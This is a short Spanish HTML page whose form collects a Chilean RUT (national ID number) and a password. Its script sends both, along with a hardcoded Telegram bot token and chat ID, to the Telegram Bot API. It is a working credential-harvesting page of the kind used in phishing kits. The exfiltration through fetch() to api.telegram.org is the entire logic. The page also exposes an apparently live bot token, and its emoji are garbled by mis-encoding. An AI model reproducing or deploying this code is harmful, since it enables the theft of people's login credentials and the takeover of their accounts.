<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Formulario a Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 40px;
      background: #f9f9f9;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: auto;
    }
    input, button {
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      font-size: 16px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
    }
  </style>
</head>
<body>

  <form id="formulario">
    <h2>Enviar datos a Telegram</h2>
    <input id="rut" placeholder="RUT" required />
    <input id="clave" type="password" placeholder="Clave" required />
    <button type="submit">Enviar</button>
  </form>

  <script>
    document.getElementById("formulario").addEventListener("submit", async function(e) {
      e.preventDefault();

      const rut = document.getElementById("rut").value;
      const clave = document.getElementById("clave").value;

      const mensaje = `üì• Nuevo formulario:\n\nüë§ RUT: ${rut}\nüîë Clave: ${clave}`;

      const telegramToken = "7558583284:AAGo_RSStbWCaAnwgpfNCZV2hVNYiSDzvDQ";
      const chatId = 8182021286;

      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

      try {
        const respuesta = await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
          })
        });

        if (respuesta.ok) {
          alert("‚úÖ Enviado a Telegram correctamente");
        } else {
          alert("‚ùå Error al enviar a Telegram");
        }

      } catch (error) {
        console.error("Error de red:", error);
        alert("‚ùå Error de red al enviar");
      }
    });
  </script>

</body>
</html>
